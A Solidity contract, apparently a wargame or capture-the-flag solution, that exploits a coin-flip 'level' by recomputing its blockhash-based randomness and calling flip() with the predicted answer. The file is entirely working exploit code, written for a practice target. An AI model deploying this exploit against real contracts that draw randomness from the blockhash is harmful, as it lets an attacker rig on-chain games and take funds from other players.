//SPDX-License-Identifier: Unlicense
pragma solidity ^0.5.17;

interface IImFeelingLucky {
    function flip(bool guess, address challenger) external;
}

contract ExploitImFeelingLucky {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exploit(address target) public {
        IImFeelingLucky level = IImFeelingLucky(target);

        // Code from original contract
        uint256 entropy = uint256(blockhash(block.number - 1));
        uint256 coinFlip = entropy / FACTOR;
        bool head = coinFlip % 2 == 0 ? true : false;

        // Flip with the right answer
        level.flip(head, msg.sender);
    }
}
